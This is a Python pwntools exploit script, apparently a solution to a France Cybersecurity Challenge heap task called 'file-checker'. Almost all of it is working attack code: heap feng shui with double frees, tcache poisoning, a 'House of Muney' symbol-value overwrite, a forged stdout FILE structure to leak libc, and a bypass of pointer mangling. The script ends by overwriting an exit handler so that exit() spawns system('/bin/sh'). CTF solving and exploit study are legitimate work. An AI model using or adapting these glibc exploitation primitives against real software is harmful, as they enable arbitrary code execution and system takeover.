#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import docker
from random import randint

#client = docker.from_env()

#context.terminal = ["tmux","split-window","-h"]

exe = context.binary = ELF(args.EXE or './file-checker_patched')

host = args.HOST or 'challenges.france-cybersecurity-challenge.fr'
port = int(args.PORT or 2101)

libc = exe.libc

docker_id = "a6e1b016a7a3" # this was the id of my docker container, needs to be changed if running with HOST=locahost PORT=XXXX and GDB debugging

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript,env={"LD_BIND_NOW":"1"}, *a, **kw)
    else:
        return process([exe.path] + argv,env={"LD_BIND_NOW":"1"}, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    #if args.GDB:
    #    gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
set pagination off
dir ../src/glibc-2.39
#br ./iconv/gconv_db.c:717
#br __gconv_find_shlib
#br find_module
#br check_match
set $_tcache = *(tcache_perthread_struct**)($fs_base - 0x40)
'''.format(**locals())

# HELPERS

prompt_prefix = b": "
cmd_prefix = b"> "

def prompt(m,**kwargs):
    r = kwargs.pop("io",io)
    prefix = kwargs.pop("prefix",prompt_prefix)
    line = kwargs.pop("line",True)
    if prefix is not None:
        if line:
            r.sendlineafter(prefix,m,**kwargs)
        else:
            r.sendafter(prefix,m,**kwargs)
    else:
        if line:
            r.sendline(m,**kwargs)
        else:
            r.send(m,**kwargs)

def prompti(i,**kwargs):
    prompt(f"{i}".encode(),**kwargs)

def cmd(i,**kwargs):
    prefix = kwargs.pop("prefix",cmd_prefix)
    prompti(i,prefix=prefix,**kwargs)

def upk(m,**kwargs):
    return unpack(m,"all",**kwargs)

def printx(**kwargs):
    for k,v in kwargs.items():
        log.critical(f"{k}: 0x{v:x}")

def docker_gdb_attach():
    pid = client.containers.get(docker_id).top()["Processes"][-1][1]
    #gdb.attach(pid, gdbscript=gdbscript) # does not work for some reason
    with open("./gdbscript","w") as cmds:
        cmds.write(gdbscript)
    dbg = process(context.terminal + ["gdb","-pid",f"{pid}","-x","./gdbscript"])
    sleep(2)

# -- Exploit goes here --
def prepare(idx,sz,filename,line=True):
    cmd(1)
    prompti(idx)
    prompti(sz)
    prompt(filename,line=line)

def clean(idx):
    cmd(2)
    prompti(idx)

def handle(idx,mode):
    cmd(3)
    prompti(idx)
    prompti(mode,prefix=b"append\n")

modes = exe.address + 0x3d10
fs_as_mode_offset = (exe.sym["files"] - modes) //8 + 1 # index to use files[0] as a mode

mmap_sz = 0x20000 # original size of corrupted mmap chunk
overwrite_sz = 0x4000 + 0xa000 # overwrite size for house of muney

locale = "NC_NC00-10"
mode = f"rb,ccs={locale}"

possible = [0x3c3,0x3f3,0x40b,0x423,0x43b,0x46b,0x483,0x49b,0x4e3,0x4fb,0x500,0x513,0x6af] # offsets where the offset to gconv_init value was found
possible_idx = 10
st_value_offset = possible[possible_idx] # actual st_value offset

heap_leak = 0
heap_offset = 0x1aa0 # offset to heap_base of leaked pointer
min_uns_sz = 0x430 # size used for unsorted chunk for shlib handle name overwrite

puts_offset = 0
def leak_heap_ptr():
    global io
    global heap_leak
    global puts_offset
    try:
        # puts offset, 8-12bits brute on remote
        sign         = 0xffffffffffd00000
        pages_diff   = randint(0,2 ** 8 - 1)
        page_offset  = 0x000bd0
        puts_offset  = sign + ( pages_diff << 12) + page_offset

        if  ("CHEAT" in args or args.GDB): # locally, without ASLR for debugging
            puts_offset = 0xffffffffffce5bd0
        puts_offset = 0xffffffffffcb0bd0
        io = start()
        gdb.attach(io)
        pause()
        # feng shui for changing __sh_lib_handle->fullname later
        prepare(0,min_uns_sz - 8 - 1, "u0")
        prepare(1,min_uns_sz - 8 - 1, "u1")
        prepare(2,0x20 - 8 - 1, "fence")
        clean(1)
        clean(0)
        prepare(0,min_uns_sz - 8 - 1 + 0x10,flat({min_uns_sz-8:0x30|1}))
        clean(0)
        clean(1) # double free
        prepare(0,0xe0 - 8 - 1, "cut")
        
        # LOAD *.so in memory
        prepare(0,len(mode) + 1,mode)
        prepare(1,0x20 - 8 - 1,"./flag.txt")
        handle(1,fs_as_mode_offset)
        
        # Set shared object name to bogus to be able to call __libc_dlsym again
        prepare(2,0x30 - 8 - 1,"pwned")
        
        # House of Muney:
        # - overwrite st_value to puts offset
        # - st_value of gconv_init stored at: 0x500
        # - puts offset: 0xffffffffffdXXbd0
        log.info("doing muney")
        prepare(2,mmap_sz,"")
        clean(2)
        prepare(3,mmap_sz+0x2000,flat({0x2000-0x10+0x8:mmap_sz+overwrite_sz+2},filler=b"\0"))
        clean(2)
        clean(3)
        with open(f"{locale}.bin","rb") as dump:
            fake = bytearray(dump.read().replace(b"\n",b"\0"))
        fake[st_value_offset:st_value_offset+8] = p64(puts_offset)
        prepare(4,mmap_sz*2+overwrite_sz-0x10,flat({mmap_sz*2+i-0x2000-0x10:fake for i in range(0x4000,overwrite_sz,0x1000)},filler=b"\0"))
        
        # Get heap leak by resolving and calling gconv_init again
        prepare(0,len(mode)+1,mode)
        prepare(1,0x20 - 8 - 1,"./flag.txt")
        pause()
        handle(1,fs_as_mode_offset)
        leak=io.recvline(False)
        if len(leak) > 8:
            heap_leak = 0
            io.close()
            return False
        else:
            heap_leak=unpack(leak,"all")
            printx(heap_leak=heap_leak)
            return True
    except EOFError:
        heap_leak = 0
        io.close()
        return False


while True: # try exploit until it works, when trying locally : using the docker image + disabling aslr + manually setting puts_offset, so it works everytime
    try:
        if args.GDB:
            leak_heap_ptr()
        else:
            i = 0
            while not leak_heap_ptr():
                log.info(f"Try #{i}")
                i+=1
                pass
        
        heap_base = heap_leak - 0x1aa0
        link = heap_leak + 0x12e0
        tcache = heap_base + 0x10
        chk_sz = 0x420
        fence_sz = 0x20
        printx(heap=heap_base,tcache=tcache,link=link)
        
        # empty tcache bins
        prepare(0,0x20-8-1,"")
        prepare(0,0xe0-8-1,"")
        prepare(0,0x1e0-8-1,"")
        
        # feng shui for overlapping chunks
        prepare(0,chk_sz - 8 - 1, "") # 0 RESERVED FOR LARGE OVERLAPPING CHUNK
        prepare(1,chk_sz - 8 - 1, "") # 1 RESERVED FOR DOUBLE FREED CHUNK WITH EDITED SIZE
        prepare(2,fence_sz - 8 - 1,"fence")
        clean(1)
        clean(0)
        
        unsorted_sz = chk_sz * 2 - 8 - 1
        
        # primitives
        def overlap_chunks(target_sz):
            prepare(0,unsorted_sz,flat({
                chk_sz-8:target_sz|1,
                chk_sz-8+target_sz:fence_sz|1
                }))
            clean(1) # double free with edited size -> linked into tcache
            clean(0)
        
        def tcache_poison(sz,addr,link=link):
            prepare(0,unsorted_sz,"") # grab unsorted chunk
            prepare(2,sz - 8 - 1,b"replaced") # will be replaced by target addr
            clean(2)
            clean(0)
            overlap_chunks(sz)
            prepare(0,unsorted_sz,flat({chk_sz: addr ^ (link >> 12)})) # fd overwrite
            clean(0)
        
        def arbw(target_sz,target_addr,target_val,link):
            tcache_poison(target_sz,target_addr,link)
            prepare(2,target_sz - 8 - 1,"")
            prepare(2,target_sz - 8 - 1,target_val)
        
        def fake_stdout(target,sz,n_fields=7):
            handle = FileStructure(0)
            handle.flags = 0xfbad1800
            handle._IO_read_end = target
            handle._IO_write_base = target
            handle._IO_write_ptr = target+sz
            return bytes(handle)[:8 * n_fields]
        
        def align(v,n=0x10):
            return ( (v + n - 1) // n ) * n
        
        file_struct_sz = 0x1e0
        chain_offset = 13 * 0x8
        stderr_stdout_offset = 0xe0
        stdout_n_fields = 7
        alloc_sz = align(0x8 + stderr_stdout_offset + 0x8 * stdout_n_fields)
        bin_target = tcache + 0x80 + 8 * (alloc_sz - 0x20) // 0x10 # 0x10 off bcz alignement
        
        printx(alloc_sz=alloc_sz,bin_target=bin_target)
        if args.GDB:
            docker_gdb_attach()
        
        # Put stderr into one tcache bin so as to be able to overwrite stdout to leak libc
        target_addr =align(bin_target-chain_offset)
        l = 0x20
        arbw(l,target_addr-0x10,flat({8:file_struct_sz},filler=b"\0",length=l-0x8-1),link) 
        tcache_poison(file_struct_sz,target_addr,link=link)
        prepare(2,alloc_sz+0x10-8-1,"./flag.txt") # tcache target bin count -> 1
        clean(2)
        prepare(2,file_struct_sz-8-1,"./flag.txt")
        handle(2,1)
        
        libc_ptr = heap_base + 0x2aa8 # TODO
        stdout = fake_stdout(libc_ptr,8)
        
        # stdout overwrite (messed up buffering) and libc leak
        prompt_prefix = None
        cmd_prefix = None
        prepare(4,alloc_sz+0x10-8-1,flat({136:heap_base+0x4000,stderr_stdout_offset:stdout},filler=b"\0",length=alloc_sz+0x10-8-1))
        libc_leak = io.recvuntil(b"\0\0")[-8:]
        libc.address = u64(libc_leak) - 0x203fd0
        
        unsorted_sz -= (alloc_sz + 0x10)
        chk_sz -= (alloc_sz + 0x10)

        # code execution after exit
        offset = ( (~puts_offset & (2 ** 64 - 1))  + 1) & (2 ** 64 - 1)
        ISO_base = libc.sym.puts + offset
        tls = ISO_base + 0x16000
        cookie = tls + 0x770 # computing fs:0x30 location (pointer mangle cookie)
        printx(libc=libc.address,cookie=cookie)
        
        def roll(v,n=17):
            return ( (v << n) & (2 ** 64 - 1) ) | (v >> (64-n))
        
        
        entry = libc.sym.initial + 0x10

        arbw(0x20,libc.sym._IO_2_1_stderr_+216 - 8 ,p64(0)+p64(libc.sym._IO_file_jumps),link) # fix stderr
        arbw(0x20,cookie,p64(0),link) # bypass pointer mangling
        arbw(0x20,entry,p64(4) + p64(roll(libc.sym.system)) + p64(next(libc.search(b"/bin/sh\0"))),link) # exit_funcs entry overwrite for the call to system('/bin/sh\0')
        cmd(4) # exit()
        io.interactive()
        break

    except EOFError:
        io.close()
        continue